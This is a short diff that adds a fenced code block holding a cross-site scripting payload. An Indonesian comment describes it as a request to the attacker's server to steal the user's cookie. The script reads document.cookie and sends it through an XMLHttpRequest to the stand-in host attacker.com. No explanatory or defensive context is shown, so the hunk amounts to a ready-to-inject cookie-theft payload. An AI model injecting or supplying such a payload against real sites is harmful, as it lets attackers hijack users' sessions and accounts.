@@ -1,0 +1,9 @@
+```
+<script>
+  // Membuat request HTTP ke server penyerang untuk mencuri cookie pengguna
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', 'http://attacker.com/steal_cookie?data=' + encodeURIComponent(document.cookie), true);
+  xhr.send();
+</script>
+```
+
